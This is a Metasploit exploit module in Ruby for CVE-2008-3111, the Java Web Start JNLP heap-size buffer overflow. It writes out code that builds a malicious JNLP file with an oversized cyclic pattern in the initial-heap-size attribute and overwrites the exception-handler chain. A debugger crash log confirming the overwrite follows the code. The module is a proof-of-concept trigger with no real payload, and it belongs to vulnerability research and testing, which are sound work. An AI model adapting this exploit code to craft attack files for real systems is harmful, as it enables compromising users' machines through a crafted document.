require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sun Java Web Start JNLP j2se Element heap-size PoC',
			'Description'    => %q{
					This is simply a trigger for the Sun Java Web Start JNLP
				j2se Element heap-size buffer overflow.
			},
			'License'        => 'BSD_LICENSE',
			'Author'         => [ 'Mario Ceballos' ],
			'References'     =>
				[
					[ 'CVE', '2008-3111' ],
					[ 'BID', '30148' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'          => 750,
					'BadChars'       => "",
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'javaws 6.0.30.5', { 'Ret' => 0x41414141 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 8 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.jnlp' ]),
			], self.class)
	end

	def exploit

		sploit = pattern_create(4024)
		sploit[3504, 8] = [target.ret].pack('V') * 2

		jnlp = %Q|<?xml version="1.0" encoding="utf-8"?>
<!-- JNLP File for SwingSet2 Demo Application -->
<jnlp
spec="1.0+"
codebase="http://my_company.com/jaws/apps"
href="swingset2.jnlp">
<information>
<title>SwingSet2 Demo Application</title>
<vendor>Oracle and/or its affiliates.</vendor>
<homepage href="docs/help.html"/>
<description>SwingSet2 Demo Application</description>
<description kind="short">A demo of the capabilities of the Swing Graphical User Interface.</description>
<icon href="images/swingset2.jpg"/>
<icon kind="splash" href="images/splash.gif"/>
<offline-allowed/>
</information>
<security>
<all-permissions/>
</security>
<resources>
<j2se version="1.4.2" initial-heap-size="#{sploit}"/>
<jar href="lib/SwingSet2.jar"/>
</resources>
<application-desc main-class="SwingSet2"/>
</jnlp>
		|

		file_create(jnlp)

	end
end
__END__
(e30.e2c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000034 ebx=00889a58 ecx=0012f1c0 edx=00130000 esi=0012ef84 edi=0012f1c0
eip=00409160 esp=0012ef30 ebp=0012efd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** WARNING: Unable to verify checksum for javaws.exe
*** ERROR: Module load completed but symbols could not be loaded for javaws.exe
javaws+0x9160:
00409160 8802            mov     byte ptr [edx],al          ds:0023:00130000=41
0:000> !exchain
0012ffb0: 41414141
Invalid exception stack at 41414141
0:000> dd ebx
00889a58  35704534 45367045 70453770 39704538
00889a68  45307145 71453171 33714532 45347145
00889a78  71453571 37714536 45387145 72453971
00889a88  31724530 45327245 72453372 35724534
00889a98  45367245 72453772 39724538 45307345
00889aa8  73453173 33734532 45347345 73453573
00889ab8  37734536 45387345 74453973 31744530
00889ac8  45327445 74453374 35744534 45367445
